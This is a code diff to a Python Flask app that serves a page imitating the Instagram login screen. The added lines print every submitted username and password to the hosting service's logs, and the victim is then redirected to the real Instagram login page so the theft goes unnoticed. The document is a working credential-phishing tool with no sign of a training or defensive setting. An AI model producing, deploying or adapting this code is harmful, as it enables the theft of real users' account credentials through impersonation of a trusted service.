@@ -6,7 +6,6 @@ html_page = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Instagram</title>
   <style>
@@ -17,7 +16,7 @@ html_page = """
       align-items: center;
       height: 100vh;
       margin: 0;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
+      font-family: system-ui;
     }
     .container {
       background-color: white;
@@ -83,9 +82,12 @@ def login():
         username = request.form.get("username")
         password = request.form.get("password")
 
-        # Optionally save to file or Sheets here
+        # 🖨️ Print to Render logs
+        print("====================================")
+        print(f"USERNAME: {username}")
+        print(f"PASSWORD: {password}")
+        print("====================================")
 
-        # Redirect to real Instagram after form is submitted
         return redirect("https://www.instagram.com/accounts/login/")
-    return render_template_string(html_page)
 
+    return render_template_string(html_page)
